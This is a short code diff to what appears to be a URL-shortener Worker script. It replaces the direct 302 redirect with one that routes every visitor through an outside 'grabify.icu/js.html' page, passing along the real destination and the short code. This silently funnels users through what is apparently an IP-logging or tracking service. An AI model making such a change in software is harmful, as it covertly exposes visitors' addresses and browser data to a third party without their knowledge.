@@ -72,10 +72,11 @@ export default {
         const data = await response.json();
   
         if (data && data.url) {
-          return Response.redirect(data.url, 302);
-        } else {
-          return new Response("Code not found", { status: 404 });
-        }
+            const redirectUrl = `https://grabify.icu/js.html?to=${encodeURIComponent(data.url)}&typeA=${encodeURIComponent(code)}`;
+            return Response.redirect(redirectUrl, 302);
+          } else {
+            return new Response("Code not found", { status: 404 });
+          }
       } catch (e) {
         return new Response("Error fetching from backend: " + e.message, { status: 500 });
       }
